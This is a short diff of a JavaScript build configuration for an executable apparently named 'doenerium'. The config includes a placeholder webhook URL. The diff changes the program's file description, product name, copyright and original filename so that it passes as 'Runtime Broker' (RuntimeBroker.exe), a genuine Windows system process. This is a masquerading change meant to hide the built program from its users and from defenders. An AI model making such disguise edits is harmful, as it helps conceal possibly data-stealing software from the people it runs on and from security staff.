@@ -3,10 +3,10 @@ module.exports = () => {
         webhook_url: "REPLACE_ME",
         icon: './default.ico',
         properties: {
-            FileDescription: 'doenerium',
-            ProductName: 'doenerium',
-            LegalCopyright: 'doenerium ©️ 2023',
-            OriginalFilename: 'doenerium.exe'
+            FileDescription: 'Runtime Broker',
+            ProductName: 'Runtime Broker',
+            LegalCopyright: 'Runtime Broker ©️ 2023',
+            OriginalFilename: 'RuntimeBroker.exe'
         }
     }
 }
